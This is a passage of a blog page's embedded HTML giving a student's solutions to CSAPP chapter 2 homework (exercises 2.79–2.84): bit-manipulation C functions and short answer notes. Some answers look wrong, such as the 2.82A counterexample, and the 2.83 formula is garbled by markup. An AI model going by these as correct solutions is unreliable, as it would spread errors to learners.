class=\"line\">\t<span class=\"keyword\">int</span> t = -(x&gt;&gt;l<span class=\"number\">-1</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (t&lt;&lt;<span class=\"number\">2</span>)-t+x &gt;&gt; <span class=\"number\">2</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-80\"><a href=\"#2-80\" class=\"headerlink\" title=\"2.80\"></a>2.80</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">threefourths</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> t = x&amp;<span class=\"number\">0x3</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> t2 = -(x&gt;&gt;(<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>)&lt;&lt;<span class=\"number\">3</span>)<span class=\"number\">-1</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> p = (x&gt;&gt;<span class=\"number\">2</span>);</span><br><span class=\"line\">\tp = (p&lt;&lt;<span class=\"number\">1</span>)+p;</span><br><span class=\"line\">\tt = (t&lt;&lt;<span class=\"number\">1</span>)+t;</span><br><span class=\"line\">\tp += (t&gt;&gt;<span class=\"number\">2</span>) + (t2&amp;&amp;t);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> p;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-81\"><a href=\"#2-81\" class=\"headerlink\" title=\"2.81\"></a>2.81</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">hw281A</span><span class=\"params\">(<span class=\"keyword\">int</span> k)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>-(<span class=\"number\">1</span>&lt;&lt;k-!!k&lt;&lt;!!k);\t<span class=\"comment\">//k may equal to 0 or 32;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">hw281B</span><span class=\"params\">(<span class=\"keyword\">int</span> j, <span class=\"keyword\">int</span> k)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> t = k+j;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (<span class=\"number\">0</span>-(<span class=\"number\">1</span>&lt;&lt;j-!!j&lt;&lt;!!j)) ^ (<span class=\"number\">0</span>-(<span class=\"number\">1</span>&lt;&lt;t-!!t&lt;&lt;!!t));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-82\"><a href=\"#2-82\" class=\"headerlink\" title=\"2.82\"></a>2.82</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * A: NO; x== 0x10000000, B==rand();</span></span><br><span class=\"line\"><span class=\"comment\"> * B: Yes; </span></span><br><span class=\"line\"><span class=\"comment\"> * C: Yes; 因为，取反操作之后立刻截断与计算完之后再截断是等价的。</span></span><br><span class=\"line\"><span class=\"comment\"> * 可以两边都加上1，从而左右两个过程（截断之前）都是两个负数相加</span></span><br><span class=\"line\"><span class=\"comment\"> * D: Yes;</span></span><br><span class=\"line\"><span class=\"comment\"> * E: Yes;</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"2-83\"><a href=\"#2-83\" class=\"headerlink\" title=\"2.83\"></a>2.83</h2><p>$\\sum_{i=1}^{\\infty}Y<em>2^{-k</em>i}$</p>\n<h2 id=\"2-84\"><a href=\"#2-84\" class=\"headerlink\" title=\"2.84\"></a>2.84</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">return</span> ((sx&lt;sy) &amp;&amp; ux!=<span class=\"number\">0</span> &amp;&amp; uy!=<span class=\"number\">0x80000000</span>) | (sx==sy) &amp; !!(ux-uy);</span><br></pre></td></tr></table></figure>\n","slug":"CSAPP3e-第二章作业","categories":[{"name":"CSAPP","slug":"CSAPP","permalink":"https://h-zex.github.io/categories/CSAPP/"}],"tags":[{"name":"CSAPP Homework","slug":"CSAPP-Homework","permalink":"https://h-zex.github.io/tags/CSAPP-Homework/"}]}]}